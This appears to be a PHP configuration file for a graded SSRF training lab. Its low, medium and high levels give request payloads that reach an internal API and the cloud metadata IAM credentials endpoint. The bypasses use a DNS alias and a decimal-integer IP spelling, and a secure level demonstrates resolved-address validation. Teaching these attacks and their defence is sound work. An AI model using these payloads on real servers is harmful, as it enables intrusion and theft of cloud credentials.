<?php
$p = '/labs/ssrf-preview/run?url=';
$meta = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/forge-role';
return [
  'low' => [
    'goal' => "Make the server fetch an internal-only service.",
    'steps' => [
      "The fetch leaves from the server, which sits on an internal network.",
      "Point it at http://internal-api/ and read the response in the preview.",
    ],
    'why' => "The server will fetch any URL you give it, so you reach hosts the internet cannot, including an internal admin API behind the network boundary.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('http://internal-api/')]],
  ],
  'medium' => [
    'goal' => "Reach the metadata service when loopback and its literal IP are blocked.",
    'steps' => [
      "127.0.0.1, localhost, and 169.254.169.254 are blocked as substrings.",
      "The metadata host also answers to the name metadata.",
      "Use http://metadata/latest/meta-data/iam/security-credentials/forge-role",
    ],
    'why' => "Blocking loopback and one IP string does not stop SSRF to other internal hosts or to the same host under a different name. The DNS name reaches the exact service the IP would.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('http://metadata/latest/meta-data/iam/security-credentials/forge-role')]],
  ],
  'high' => [
    'goal' => "Reach metadata when names and the 169.254 range are denied as text.",
    'steps' => [
      "The denylist matches text in the host, not resolved addresses.",
      "Write 169.254.169.254 as a single decimal integer: 2852039166, which resolves to the same host.",
      "Use http://2852039166/latest/meta-data/iam/security-credentials/forge-role",
    ],
    'why' => "One address has many spellings. The decimal form is not in the denylist, but the operating system resolves it to 169.254.169.254, so the request still hits the metadata service and returns cloud credentials.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('http://2852039166/latest/meta-data/iam/security-credentials/forge-role')]],
  ],
  'secure' => [
    'goal' => "Confirm resolve-and-validate blocks internal targets.",
    'steps' => [
      "The host is resolved and rejected if the address is private, loopback, or link-local; the scheme is allowlisted.",
      "Send http://internal-api/ or the decimal metadata IP and watch both be refused.",
    ],
    'why' => "Validating the resolved IP (not the text) against private and reserved ranges blocks every spelling, because they all resolve to a forbidden address.",
    'run' => [['method' => 'GET', 'path' => $p . rawurlencode('http://2852039166/latest/x')]],
  ],
];
